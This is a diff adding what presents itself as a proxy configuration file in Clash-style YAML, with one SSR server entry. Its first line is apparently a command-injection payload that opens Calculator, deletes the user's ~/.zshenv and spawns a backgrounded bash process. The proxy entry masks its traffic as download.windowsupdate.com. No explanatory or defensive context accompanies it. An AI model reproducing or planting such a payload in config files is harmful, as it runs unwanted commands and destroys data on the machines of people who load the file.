@@ -1,0 +1,8 @@
+open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10 2>&1 > /dev/null &' <<!:
+  aaaaa: 11111
+
+proxies:
+  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}
+
+aaaaa: 2222
+
